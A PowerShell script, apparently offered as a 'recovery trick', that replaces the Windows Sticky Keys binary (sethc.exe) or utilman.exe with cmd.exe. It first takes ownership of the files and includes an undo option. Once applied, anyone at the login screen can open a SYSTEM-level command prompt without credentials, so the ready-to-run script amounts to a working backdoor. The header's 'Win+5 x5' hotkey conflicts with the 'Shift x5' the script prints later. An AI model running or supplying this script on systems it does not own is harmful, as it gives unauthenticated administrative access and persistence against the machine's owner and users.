# sethc-swap.ps1 - swap the lock-screen sticky-keys binary with cmd.exe
# (classic recovery trick: Win+5 x5 at the login screen opens an elevated cmd)
#
# usage (run as ADMIN on the target PC):
#   pwsh -File sethc-swap.ps1          apply:  sethc.exe -> sethc-old.exe, cmd.exe -> sethc.exe
#   pwsh -File sethc-swap.ps1 -Undo    revert: sethc-old.exe -> sethc.exe
#
# notes:
# - must run elevated (needs SeTakeOwnershipPrivilege for TrustedInstaller-owned files)
# - keep sethc-old.exe around; -Undo needs it
# - Windows File Protection may restore the original after a major update; just re-run
# - works for utilman.exe the same way with -Binary utilman

param(
    [switch]$Undo,
    [string]$Binary = "sethc"
)

$ErrorActionPreference = "Stop"
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Error "run as ADMIN"
    exit 1
}

$sys = Join-Path $env:SystemRoot "System32"
$orig    = Join-Path $sys "$Binary.exe"
$backup  = Join-Path $sys "$Binary-old.exe"
$cmd     = Join-Path $sys "cmd.exe"

function Take-Ownership($path) {
    takeown /f $path | Out-Null
    icacls $path /grant "Administrators:F" | Out-Null
}

if ($Undo) {
    if (-not (Test-Path $backup)) { Write-Error "$backup not found - nothing to revert"; exit 1 }
    Take-Ownership $orig
    Remove-Item $orig -Force
    Rename-Item $backup "$Binary.exe"
    Write-Output "reverted: $Binary-old.exe -> $Binary.exe"
    exit 0
}

if (-not (Test-Path $orig))  { Write-Error "$orig not found"; exit 1 }
if (-not (Test-Path $cmd))   { Write-Error "$cmd not found"; exit 1 }

Take-Ownership $orig
if (Test-Path $backup) { Remove-Item $backup -Force }
Rename-Item $orig "$Binary-old.exe"
Copy-Item $cmd (Join-Path $sys "$Binary.exe") -Force

Write-Output "done: $Binary.exe is now cmd.exe (original saved as $Binary-old.exe)"
Write-Output "at the login screen press Win+5 five times (or Shift x5) for an elevated cmd"
Write-Output "revert anytime: pwsh -File sethc-swap.ps1 -Undo"
